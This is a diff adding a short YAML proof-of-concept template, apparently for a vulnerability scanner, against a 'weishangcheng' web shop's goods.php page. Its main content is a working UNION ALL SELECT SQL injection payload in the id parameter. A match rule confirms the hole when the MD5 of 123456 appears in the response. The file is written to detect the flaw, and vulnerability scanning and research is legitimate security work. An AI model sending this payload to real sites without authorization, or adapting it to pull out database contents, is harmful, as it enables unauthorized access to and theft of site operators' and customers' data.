@@ -1,0 +1,21 @@
+name: poc-yaml-weishangcheng-goods.php-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /goods.php?id='+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(IFNULL(CAST(MD5(123456)+AS+NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+    expression: response.status == 200 && response.body.bcontains(b'e10adc3949ba59abbe56e057f20f883e')
+
+expression: r0() 
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486641&idx=1&sn=642495eafd7108878e12e5d9b8e242f9&chksm=c267b982f51030946dd604381cffc2dc8c44e15dbb8f302eb9521151c9891878fdc0bb3d79f7&token=522460222&lang=zh_CN#rd
+
+
